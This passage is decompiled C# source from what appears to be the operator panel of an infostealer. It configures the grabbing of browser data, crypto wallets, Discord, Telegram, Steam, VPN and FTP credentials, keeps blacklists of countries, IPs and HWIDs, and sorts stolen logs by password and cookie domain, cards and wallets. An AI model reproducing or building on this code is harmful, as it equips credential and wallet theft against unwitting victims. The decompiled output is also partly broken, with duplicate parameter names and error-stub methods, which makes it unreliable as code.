            ((AnimaTextBox)privateCreatorKeyTb).Text = "*********";
        }
        else
        {
            ((AnimaTextBox)privateCreatorKeyTb).Text = "NOT AVAILABLE";
        }
    }

    [CompilerGenerated]
    private void Method_10(uint page, int page)
    {
        int page = (int)page;
        if (page >= 0 && page < LazyLoader<UserLogsDb>.Instance.PageController.PagesCount)
        {
            Invoke((MethodInvoker)delegate
            {
                ((Control)db).Text = (page + 1).ToString();
                ((DataGridView)logsListView).DataSource = LazyLoader<UserLogsDb>.Instance.PageController.Pages[page];
            });
        }
    }

    [CompilerGenerated]
    private void method_11(object _, object __)
    {
        ProcessNotifies();
    }

    [CompilerGenerated]
    private void method_12(object _, object __)
    {
        lock (MetaEvents.Counter)
        {
            ((Control)activeConnections).Text = MetaEvents.Counter.ToString();
            MetaEvents.Counter = 0;
        }
    }

    [CompilerGenerated]
    private void method_13(uint count)
    {
        int count = (int)count;
        try
        {
            if (count < LazyLoader<UserLogsDb>.Instance.PageController.PageSize)
            {
                LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = 1;
            }
            else
            {
                LazyLoader<UserLogsDb>.Instance.PageController.PagesCount = count / LazyLoader<UserLogsDb>.Instance.PageController.PageSize + 1;
            }
            lock (object_1)
            {
                if (base.InvokeRequired)
                {
                    Invoke((MethodInvoker)delegate
                    {
                        ((Control)df).Text = count.ToString();
                        ((Control)dd).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
                    });
                }
                else
                {
                    ((Control)df).Text = count.ToString();
                    ((Control)dd).Text = LazyLoader<UserLogsDb>.Instance.PageController.PagesCount.ToString();
                }
            }
        }
        catch
        {
        }
    }

    [CompilerGenerated]
    private object method_14()
    {
        /*Error: Method body consists only of 'ret', but nothing is being returned. Decompiled assembly might be a reference assembly.*/
        ;
    }

    [CompilerGenerated]
    private object method_15()
    {
        /*Error: Method body consists only of 'ret', but nothing is being returned. Decompiled assembly might be a reference assembly.*/
        ;
    }

    [CompilerGenerated]
    private object method_16()
    {
        while (true)
        {
            try
            {
                lock (this.m_a)
                {
                    ((StatisticDb)object_8).SaveSettings();
                }
            }
            catch (Exception)
            {
            }
            Task.Delay(TimeSpan.FromSeconds(30.0)).Wait();
        }
    }

    [CompilerGenerated]
    private void method_17()
    {
        try
        {
            GuestHttpServer guestHttpServer = new GuestHttpServer(20);
            AddNotify("GuestHttpServer is starting");
            guestHttpServer.ProcessRequest += c;
            guestHttpServer.Start("+", ((ServiceSettings)object_3).GuestPort);
            AddNotify("GuestHttpServer is running");
        }
        catch (Exception arg)
        {
            AddNotify($"GuestHttpServer error: {arg}");
        }
    }

    [CompilerGenerated]
    private object method_18()
    {
        while (true)
        {
            try
            {
                CheckUpdates();
            }
            catch
            {
            }
            Thread.Sleep(TimeSpan.FromMinutes(10.0));
        }
    }

    [CompilerGenerated]
    private void method_19()
    {
        ((MetroSetCheckBox)discordCb).Checked = RemoteClientSettings.GrabDiscord;
        ((MetroSetCheckBox)grabColdWalletCb).Checked = RemoteClientSettings.GrabWallets;
        ((MetroSetCheckBox)grabBrowsersCb).Checked = RemoteClientSettings.GrabBrowsers;
        ((MetroSetCheckBox)grabFilesCb).Checked = RemoteClientSettings.GrabFiles;
        ((MetroSetCheckBox)grabFtpsCb).Checked = RemoteClientSettings.GrabFTP;
        ((MetroSetCheckBox)grabImClientsCb).Checked = RemoteClientSettings.GrabImClients;
        ((MetroSetCheckBox)duplicateCb).Checked = RemoteClientSettings.AntiDuplicate;
        ((MetroSetCheckBox)blockEmptyLogsCb).Checked = RemoteClientSettings.BlockEmptyLogs;
        ((MetroSetCheckBox)this.m_a6).Checked = RemoteClientSettings.SaveAsJSON;
        ((MetroSetCheckBox)cc).Checked = RemoteClientSettings.GrabVPN;
        ((MetroSetCheckBox)cf).Checked = RemoteClientSettings.GrabScreenshot;
        ((MetroSetCheckBox)d1).Checked = RemoteClientSettings.GrabTelegram;
        ((MetroSetCheckBox)ca).Checked = RemoteClientSettings.GrabSteam;
        ((AnimaTextBox)e6).Text = RemoteClientSettings.AutosaveDirectory;
        ((AnimaTextBox)this.m_b6).Text = RemoteClientSettings.TelegramBotToken;
        ((MetroSetCheckBox)autoStartTelegramCb).Checked = RemoteClientSettings.AutoStart;
        ((AnimaTextBox)logsHeaderTb).Text = SettingsOfPanel.Default.LogHeader;
        ((MetroSetCheckBox)autoRefreshCb).Checked = RemoteClientSettings.AutoRefreshCookies;
        ((MetroSetCheckBox)autoUpdatePanelCb).Checked = RemoteClientSettings.AutoUpdate;
        ((ListBox)cd).Items.Clear();
        ((ListBox)blackListBuildsLb).Items.Clear();
        ((ListBox)fe).Items.Clear();
        ((ListBox)blackListIPsLb).Items.Clear();
        ((ListBox)blackListLb).Items.Clear();
        ((ListBox)getFilesSettingsLb).Items.Clear();
        ((ListBox)browsersExtensionsListBox).Items.Clear();
        foreach (string dDPattern in RemoteClientSettings.DDPatterns)
        {
            ((ListBox)cd).Items.Add(dDPattern);
        }
        foreach (string blackListedBuild in RemoteClientSettings.BlackListedBuilds)
        {
            ((ListBox)blackListBuildsLb).Items.Add(blackListedBuild);
        }
        foreach (string item in RemoteClientSettings.BlacklistedHWID)
        {
            ((ListBox)fe).Items.Add(item);
        }
        foreach (string blackListedIP in RemoteClientSettings.BlackListedIPS)
        {
            ((ListBox)blackListIPsLb).Items.Add(blackListedIP);
        }
        foreach (string item2 in RemoteClientSettings.BlacklistedCountry)
        {
            ((ListBox)blackListLb).Items.Add(item2);
        }
        foreach (string grabPath in RemoteClientSettings.GrabPaths)
        {
            ((ListBox)getFilesSettingsLb).Items.Add(grabPath);
        }
        foreach (string browserExtension in RemoteClientSettings.BrowserExtensions)
        {
            ((ListBox)browsersExtensionsListBox).Items.Add(browserExtension);
        }
        if (System.IO.File.Exists("sorterState.json"))
        {
            try
            {
                SingleSearchParams singleSearchParams = System.IO.File.ReadAllText("sorterState.json").FromJSON<SingleSearchParams>();
                ((AnimaTextBox)this.m_a9).Text = singleSearchParams.SetComment;
                ((AnimaTextBox)this.m_a7).Text = singleSearchParams.SkipComment;
                ((AnimaTextBox)singleIdSortTb).Text = singleSearchParams.BuildID;
                ((AnimaTextBox)singleCommentSortTb).Text = singleSearchParams.Comment;
                ((AnimaTextBox)singleOsSortTb).Text = singleSearchParams.OS;
                ((AnimaTextBox)singleCountrySortTb).Text = singleSearchParams.Country;
                ((MetroSetCheckBox)singleAfSortCb).Checked = singleSearchParams.ContainsAFs;
                ((MetroSetCheckBox)singleCCsSortCb).Checked = singleSearchParams.ContainsCCs;
                ((MetroSetCheckBox)singleFilesSortCb).Checked = singleSearchParams.ContainsFiles;
                ((MetroSetCheckBox)singleFtpsSortCb).Checked = singleSearchParams.ContainsFTPs;
                ((AnimaTextBox)singleCookieSortTb).Text = singleSearchParams.CookieDomain;
                ((AnimaTextBox)singlePasswordSortTb).Text = singleSearchParams.PasswordDomain;
                ((MetroSetCheckBox)singleColdWalletSortCb).Checked = singleSearchParams.ContainsWallets;
                ((MetroSetCheckBox)ba).Checked = singleSearchParams.SkipCookies;
                ((MetroSetCheckBox)b8).Checked = singleSearchParams.SkipPasswords;
                ((MetroSetCheckBox)ea).Checked = singleSearchParams.RefreshDD;
                ((MetroSetCheckBox)be).Checked = singleSearchParams.SkipChecked;
                ((AnimaTextBox)ef).Text = singleSearchParams.FilesToSearch;
                ((MetroSetCheckBox)f1).Checked = singleSearchParams.ContainsSteam;
                ((MetroSetCheckBox)f3).Checked = singleSearchParams.ContainsTelegram;
                ((NumericUpDown)passMoreThan).Value = singleSearchParams.PasswordsMoreThan;
                ((NumericUpDown)cookiesMoreThan).Value = singleSearchParams.CookiesMoreThan;
                ((DateTimePicker)d5).Value = singleSearchParams.LogFrom;
                ((DateTimePicker)d6).Value = singleSearchParams.LogTo;
            }
            catch
            {
            }
        }
    }

    [CompilerGenerated]
    private void method_20()
    {
        try
        {
            lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
            {
                lock (this.m_a)
                {
                    ((StatisticDb)object_8).SetDefault();
                    ((StatisticDb)object_8).SaveSettings();
                }
                UpdateStat();
                Invoke((MethodInvoker)delegate
                {
                    LazyLoader<UserLogsDb>.Instance.ClearDb();
                });
                LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
            }
            AddNotify("A List of logs cleared");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.ToString());
        }
    }

    [CompilerGenerated]
    private void a0(uint index, uint total)
    {
        int index = (int)index;
        int total = (int)total;
        Invoke((MethodInvoker)delegate
        {
            ((Control)domainSorterLbl).Text = $"{index} / {total}";
        });
    }

    [CompilerGenerated]
    private void a1()
    {
        ((Control)domainSorterLbl).Text = "Waiting";
        ((Control)currentDomainLbl).Text = "None";
    }

    [CompilerGenerated]
    private void a2()
    {
        try
        {
            OpenFileDialog ofd = new OpenFileDialog();
            try
            {
                ofd.Filter = "Ico files (*.ico)|*.ico";
                ofd.CheckPathExists = true;
                ofd.InitialDirectory = Directory.GetCurrentDirectory();
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                Invoke((MethodInvoker)delegate
                {
                    if (ofd.ShowDialog(this) == DialogResult.OK)
                    {
                        ((AnimaTextBox)iconPath).Text = ofd.FileName;
                    }
                });
            }
            finally
            {
                if (ofd != null)
                {
                    ((IDisposable)ofd).Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    [CompilerGenerated]
    private void a3()
    {
        UserLog[] array = new UserLog[0];
        lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
        {
            array = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
        }
        UserLog[] array2 = array;
        for (int i = 0; i < array2.Length; i++)
        {
            UserLog item = array2[i];
            if (item.IsMatch((string)object_6))
            {
                ((Collection<UserLog>)object_5).Add(item);
            }
        }
    }

    [CompilerGenerated]
    private void a4()
    {
        ((DataGridView)logsListView).DataSource = object_5;
    }

    [CompilerGenerated]
    private void a5()
    {
        try
        {
            lock (this.m_a)
            {
                ((StatisticDb)object_8).SetDefault();
                ((StatisticDb)object_8).SaveSettings();
            }
            UpdateStat();
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.ToString());
        }
    }

    [CompilerGenerated]
    private void a6()
    {
        try
        {
            OpenFileDialog ofd = new OpenFileDialog();
            try
            {
                ofd.Filter = "Txt files (*.txt)|*.txt";
                ofd.CheckPathExists = true;
                ofd.InitialDirectory = Directory.GetCurrentDirectory();
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                Invoke((MethodInvoker)delegate
                {
                    if (ofd.ShowDialog(this) == DialogResult.OK)
                    {
                        string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                        foreach (string item in array)
                        {
                            ((ListBox)getFilesSettingsLb).Items.Add(item);
                        }
                    }
                });
            }
            finally
            {
                if (ofd != null)
                {
                    ((IDisposable)ofd).Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    [CompilerGenerated]
    private void a7()
    {
        try
        {
            OpenFileDialog ofd = new OpenFileDialog();
            try
            {
                ofd.Filter = "Txt files (*.txt)|*.txt";
                ofd.CheckPathExists = true;
                ofd.InitialDirectory = Directory.GetCurrentDirectory();
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                Invoke((MethodInvoker)delegate
                {
                    if (ofd.ShowDialog(this) == DialogResult.OK)
                    {
                        string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                        foreach (string item in array)
                        {
                            ((ListBox)cd).Items.Add(item);
                        }
                    }
                });
            }
            finally
            {
                if (ofd != null)
                {
                    ((IDisposable)ofd).Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    [CompilerGenerated]
    private void a8()
    {
        try
        {
            OpenFileDialog ofd = new OpenFileDialog();
            try
            {
                ofd.Filter = "Txt files (*.txt)|*.txt";
                ofd.CheckPathExists = true;
                ofd.InitialDirectory = Directory.GetCurrentDirectory();
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                Invoke((MethodInvoker)delegate
                {
                    if (ofd.ShowDialog(this) == DialogResult.OK)
                    {
                        string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                        foreach (string item in array)
                        {
                            ((ListBox)blackListIPsLb).Items.Add(item);
                        }
                    }
                });
            }
            finally
            {
                if (ofd != null)
                {
                    ((IDisposable)ofd).Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    [CompilerGenerated]
    private void a9(uint index, uint total)
    {
        int index = (int)index;
        int total = total;
        Invoke((MethodInvoker)delegate
        {
            ((Control)this.m_af).Text = $"{index} / {total}";
        });
    }

    [CompilerGenerated]
    private void aa()
    {
        ((Control)this.m_af).Text = "Waiting";
        ((Control)this.m_ab).Text = "None";
    }

    [CompilerGenerated]
    private void ab(object x)
    {
        BuildByDefaultCommand((Update)x);
    }

    [CompilerGenerated]
    private void ac()
    {
        ((ListBox)recipientsIdsListBox).Items.Clear();
        lock (((TelegramChatsDb)e).RootLocker)
        {
            string[] chatIds = ((TelegramChatsDb)e).chatsSettings.Select((TelegramChatSettings x) => x.ChatId.ToString())?.ToArray();
            Invoke((MethodInvoker)delegate
            {
                ListBox.ObjectCollection items = ((ListBox)recipientsIdsListBox).Items;
                object[] items2 = chatIds ?? new string[0];
                items.AddRange(items2);
            });
        }
    }

    [CompilerGenerated]
    private void ad()
    {
        try
        {
            LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
            LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
            UserLog[] source;
            lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
            {
                source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
            }
            BindingList<UserLog> bindingList = new BindingList<UserLog> { source.Where((UserLog x) => x.Creds == "0|0|0|0") };
            foreach (UserLog newLog in bindingList)
            {
                LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
            }
            LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
            LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
            LazyLoader<UserLogsDb>.Instance.PageController.Clear();
            LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
            LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
            MessageBox.Show(this, $"Removed {bindingList.Count} empty logs");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.ToString());
        }
    }

    [CompilerGenerated]
    private void ae()
    {
        try
        {
            LazyLoader<UserLogsDb>.Instance.PageController.Pages[LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage].RaiseListChangedEvents = false;
            LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = false;
            UserLog[] source;
            lock (LazyLoader<UserLogsDb>.Instance.DataBaseLock)
            {
                source = LazyLoader<UserLogsDb>.Instance.DbInstance.ToArray();
            }
            BindingList<UserLog> bindingList = new BindingList<UserLog> { source.Where((UserLog x) => x.Checked) };
            foreach (UserLog newLog in bindingList)
            {
                LazyLoader<UserLogsDb>.Instance.Delete((UserLog x) => x.ID == newLog.ID);
            }
            LazyLoader<UserLogsDb>.Instance.DbInstance.RaiseListChangedEvents = true;
            LazyLoader<UserLogsDb>.Instance.DbInstance.ResetBindings();
            LazyLoader<UserLogsDb>.Instance.PageController.Clear();
            LazyLoader<UserLogsDb>.Instance.PageController.FillData(LazyLoader<UserLogsDb>.Instance.DbInstance);
            LazyLoader<UserLogsDb>.Instance.PageController.CurrentPage = 0;
            MessageBox.Show(this, $"Removed {bindingList.Count} checked logs");
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.ToString());
        }
    }

    [CompilerGenerated]
    private void af()
    {
        try
        {
            OpenFileDialog ofd = new OpenFileDialog();
            try
            {
                ofd.Filter = "Txt files (*.txt)|*.txt";
                ofd.CheckPathExists = true;
                ofd.InitialDirectory = Directory.GetCurrentDirectory();
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                Invoke((MethodInvoker)delegate
                {
                    if (ofd.ShowDialog(this) == DialogResult.OK)
                    {
                        string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                        foreach (string item in array)
                        {
                            ((ListBox)fe).Items.Add(item);
                        }
                    }
                });
            }
            finally
            {
                if (ofd != null)
                {
                    ((IDisposable)ofd).Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    [CompilerGenerated]
    private void b0()
    {
        try
        {
            OpenFileDialog ofd = new OpenFileDialog();
            try
            {
                ofd.Filter = "Txt files (*.txt)|*.txt";
                ofd.CheckPathExists = true;
                ofd.InitialDirectory = Directory.GetCurrentDirectory();
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                Invoke((MethodInvoker)delegate
                {
                    if (ofd.ShowDialog(this) == DialogResult.OK)
                    {
                        string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                        foreach (string item in array)
                        {
                            ((ListBox)blackListLb).Items.Add(item);
                        }
                    }
                });
            }
            finally
            {
                if (ofd != null)
                {
                    ((IDisposable)ofd).Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    [CompilerGenerated]
    private void b1()
    {
        try
        {
            OpenFileDialog ofd = new OpenFileDialog();
            try
            {
                ofd.Filter = "Txt files (*.txt)|*.txt";
                ofd.CheckPathExists = true;
                ofd.InitialDirectory = Directory.GetCurrentDirectory();
                ofd.RestoreDirectory = true;
                ofd.Multiselect = false;
                Invoke((MethodInvoker)delegate
                {
                    if (ofd.ShowDialog(this) == DialogResult.OK)
                    {
                        string[] array = System.IO.File.ReadAllLines(ofd.FileName);
                        foreach (string item in array)
                        {
                            ((ListBox)blackListBuildsLb).Items.Add(item);
                        }
                    }
                });
            }
            finally
            {
                if (ofd != null)
                {
                    ((IDisposable)ofd).Dispose();
                }
            }
        }
        catch (Exception ex)
        {
            MessageBox.Show(this, "Error: " + ex.Message);
        }
    }

    [CompilerGenerated]
    private void b2()
    {
        object obj = virusTotalTextbox;
        ((AnimaTextBox)obj).Text = ((AnimaTextBox)obj).Text + DateTime.Now.ToString("dd.MM.yyyy HH:mm") + " | Stopped" + Environment.NewLine;
        ((MetroSetButton)metroSetButton3).Enabled = true;
        ((Control)metroSetButton3).Text = "Start";
    }

    [CompilerGenerated]
    private void b3()
    {
    }

    [CompilerGenerated]
    private void b4()
    {
    }

    [CompilerGenerated]
    private void b5()
    {
        ((AnimaTextBox)scanResults).Text = "";
    }

    [CompilerGenerated]
    private uint b6(GuestLink x)
    {
        return (x.BuildID == ((AnimaTextBox)guestBuildID).Text) ? 1u : 0u;
    }
}
